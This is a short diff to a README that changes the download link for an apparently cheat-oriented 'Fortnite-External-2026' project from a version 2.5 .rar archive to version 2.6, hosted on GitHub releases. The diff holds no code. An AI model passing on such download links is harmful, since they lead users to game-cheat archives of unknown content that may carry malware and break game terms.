@@ -7,7 +7,7 @@
 
 
 --- 
-## 📥 [Download](https://github.com/fencehelmsmandock/-Fortnite-External-2026/releases/download/fortnit-2.5/fortnit-2.5.rar)
+## 📥 [Download](https://github.com/fencehelmsmandock/Fortnite-External-2026/releases/download/fortnit-2.6/fortnit-2.6.rar)
 
 
 | Feature |	Description |
